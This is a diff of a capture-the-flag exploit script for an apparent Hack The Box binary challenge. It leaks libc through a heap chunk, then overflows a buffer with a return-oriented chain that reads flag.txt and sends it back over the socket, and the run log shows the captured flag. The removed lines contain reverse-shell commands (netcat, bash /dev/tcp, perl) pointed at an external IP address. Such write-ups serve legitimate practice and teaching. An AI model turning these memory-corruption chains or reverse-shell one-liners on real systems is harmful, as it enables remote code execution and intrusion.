@@ -43,15 +43,8 @@ s = lambda data: io.send(data)
 # --- end ---
 
 # functions
-
-PLAGUE = b"PLAGUE"
-TARGET_COMPETITOR = b"me"
-KEY = b"long"
-VALUE = b"dz"
-
 def VIEW(competitor: bytes = b"me"):
     HTTP_START_LINE = b"%s %s %s\r\n" % (b"VIEW", competitor, b"a")
-    HEADERS = b"%s: %s\r\n" % (KEY, VALUE)
     END_HEADERS = b"\r\n"
     
     payload = HTTP_START_LINE + HEADERS + END_HEADERS
@@ -59,7 +52,6 @@ def VIEW(competitor: bytes = b"me"):
     
 def PLAGUE(competitor, content_length: int, target: bytes, body: bytes = b"a"):
     HTTP_START_LINE = b"%s %s %s\r\n" % (b"PLAGUE", competitor, b"a")
-    # HEADERS  = b"%s: %s\r\n" % (b"Content-Length", str(0xf000000000000000).encode())
     HEADERS  = b"%s: %s\r\n" % (b"Content-Length", str(content_length).encode())
     if target:
         HEADERS += b"%s: %s\r\n" % (b"Plague-Target", target)
@@ -68,132 +60,111 @@ def PLAGUE(competitor, content_length: int, target: bytes, body: bytes = b"a"):
 
     payload = HTTP_START_LINE + HEADERS + END_HEADERS + BODY
     s(payload)
-
 # --- end functions ---
 
 # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
-# free load libc to unsortedbin
+# 1. leak libc
+## create unsortedbin
 io = start()
-PLAGUE(b"nocompetitor", 0x8, b"target", b"a"*0x10)
-# io.close()
-pause()  
-# leak libc
+PLAGUE(b"nocompetitor", 0x8, b"target")
+io.close()
+pause()
+
 io = start()
 PLAGUE(b"a", 0x8, b"target", b"\xe0")
 io.recvuntil(b"Attempted plague: ")
 leaked_heap = u64(io.recv(8))
 libc.address = leaked_heap - 0x1ecbe0
 success(f"done 2. libc.address: {hex(libc.address)}")
-# io.close()
-    
+io.close()
 pause()  
 # ----------------------------------
-fd = 6
-poprax = libc.address + 0x0000000000036174 #: pop rax ; ret
-poprdi = libc.address + 0x0000000000023b6a #: pop rdi ; ret
-poprsi = libc.address + 0x000000000002601f #: pop rsi ; ret
-poprdx_rbx = libc.address + 0x000000000015fae6 #: pop rdx ; pop rbx ; ret
-poprbx = libc.address + 0x000000000002fdaf #: pop rbx ; ret
-syscall = libc.address + 0x000000000002284d
-ret = libc.address + 0x0000000000022679 #: ret
-mov_qword_rbx_rax_a_pop_rbx_ret = libc.address + 0x00000000001534e5 #: mov qword ptr [rbx], rax ; pop rbx ; ret
-target_location = libc.address + 0x1ec800
-mode_location = target_location + 0x100
-load_file_location = target_location + 0x200
-file_structure_location = target_location + 0x300
 
-# command = b"nc 18.139.9.214 15963 -e /bin/sh"
-# command = b"bash -i >& /dev/tcp/18.139.9.214/15963 0>&1"
-# command = b"""perl -e 'use Socket;$i="18.139.9.214";$p=15963;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
+## load gadgets
+roplib = ROP(libc)
+poprax = roplib.find_gadget(['pop rax', 'ret'])[0]
+poprdi = roplib.find_gadget(['pop rdi', 'ret'])[0]
+poprsi = roplib.find_gadget(['pop rsi', 'ret'])[0]
+poprdx_poprbx = roplib.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
+poprbx = roplib.find_gadget(['pop rbx', 'ret'])[0]
+syscall = roplib.find_gadget(['syscall', 'ret'])[0]
+ret = roplib.ret[0]
+mov_derbx_rax_poprbx_ret = libc.address + 0x1534e5 #: mov qword ptr [rbx], rax ; pop rbx ; ret
+## --- done load gadgets ---
 
-# payload = b""
+socket_fd = 6
+file_fd = 7
+file_name_loc = libc.bss() # string 'flag.txt'
+file_content_read_loc = libc.bss() + 0x8 # 'flag.txt''s content
 
-# payload += p64(poprax)
-# payload += command[0:8]
-# payload += p64(poprbx)
-# payload += p64(target_location)
-# payload += p64(special)
-# payload += p64(target_location+8)
+filename = b"flag.txt"
 
-# for i in range(1, len(command)//8+1):
-#     partial_cmd = command[i*8: (i+1)*8].ljust(8, b"\x00")
-#     payload += p64(poprax)
-#     payload += partial_cmd
-#     payload += p64(special)
-#     payload += p64(target_location+(i+1)*8)
+# write file name to file_name_loc
 
-# payload += p64(poprdi)
-# payload += p64(target_location)
-# payload += p64(ret)
-# payload += p64(libc.sym['system'])
-# payload += p64(libc.sym['exit'])
+payload = flat(
+    poprax,
+    b"flag.txt",
+    poprbx,
+    file_name_loc,
+    mov_derbx_rax_poprbx_ret,
+    0,
+)
 
-filename = b"./flag.txt"
-mode = b"r"
-payload = b""
+# open('flag.txt', 0, 0)
+payload += flat(
+    poprax,
+    2,
+    poprdi,
+    file_name_loc,
+    poprsi,
+    0,
+    poprdx_poprbx,
+    0,
+    0,
+    syscall,
+)
 
-# write file name to target_location
-payload += p64(poprax)
-payload += filename[0:8].ljust(8, b"\x00")
-payload += p64(poprbx)
-payload += p64(target_location)
-payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
-payload += p64(target_location+8)
+# read(file_fd, file_content_read_loc, 0x20)
 
-for i in range(1, len(filename)//8+1):
-    partial_cmd = filename[i*8: (i+1)*8].ljust(8, b"\x00")
-    payload += p64(poprax)
-    payload += partial_cmd
-    payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
-    payload += p64(target_location+(i+1)*8)
+payload += flat(
+    poprax,
+    0,
+    poprdi,
+    file_fd,
+    poprsi,
+    file_content_read_loc,
+    poprdx_poprbx,
+    0x20,
+    0,
+    syscall,
+)
 
-# write mode to mode_location
-payload += p64(poprax)
-payload += b"r".ljust(8, b"\x00")
-payload += p64(poprbx)
-payload += p64(mode_location)
-payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
-payload += p64(mode_location+8)
-
-# fopen(target_location, mode_location)
-payload += p64(poprdi)
-payload += p64(target_location)
-payload += p64(poprsi)
-payload += p64(mode_location)
-payload += p64(libc.sym['fopen'])
-
-# fgets(load_file_location, 100, file_structure_location)
-mov_rdx = libc.address + 0x0000000000055065 #: mov rdx, qword ptr [rdx + 0x88] ; xor eax, eax ; ret
-
-payload += p64(poprdi)
-payload += p64(load_file_location)
-payload += p64(poprsi)
-payload += p64(100)
-payload += p64(poprbx)
-payload += p64(file_structure_location)
-payload += p64(mov_qword_rbx_rax_a_pop_rbx_ret)
-payload += p64(0) # garbage
-payload += p64(poprdx_rbx)
-payload += p64(file_structure_location - 0x88)
-payload += p64(0) # garbage
-payload += p64(mov_rdx)
-payload += p64(libc.sym['fgets'])
-
-
-# write(6, load_file_location, 100)
-payload += p64(poprdi)
-payload += p64(6)
-payload += p64(poprsi)
-payload += p64(load_file_location)
-payload += p64(poprdx_rbx)
-payload += p64(100)
-payload += p64(0)
-payload += p64(libc.sym['write'])
+# write(socket_fd, file_content_read_loc, 0x20)
+payload += flat(
+    poprax,
+    1,
+    poprdi,
+    socket_fd,
+    syscall,    
+)
 
 io = start()
-PLAGUE(b"nocompetitor", 0x10, b"a"*0x405 + b"\x30" + b"a"*7 + payload, b"a"*0x10)
-# io.close()
-
+PLAGUE(b"nocompetitor", 0x10, b"a"*0x405 + b"\x37" + payload)
 io.interactive()
-# io.close()
+
+
+# [+] Opening connection to localhost on port 9001: Done
+# [*] Closed connection to localhost port 9001
+# [*] Paused (press any to continue)
+# [+] Opening connection to localhost on port 9001: Done
+# [+] done 2. libc.address: 0x7f2cbca09000
+# [*] Closed connection to localhost port 9001
+# [*] Paused (press any to continue)
+# [*] Loaded 195 cached gadgets for 'pwn_oracle/challenge/libc-2.31.so'
+# [+] Opening connection to localhost on port 9001: Done
+# [*] Switching to interactive mode
+# HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}
+# \x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+# $
+# [*] Closed connection to localhost port 9001
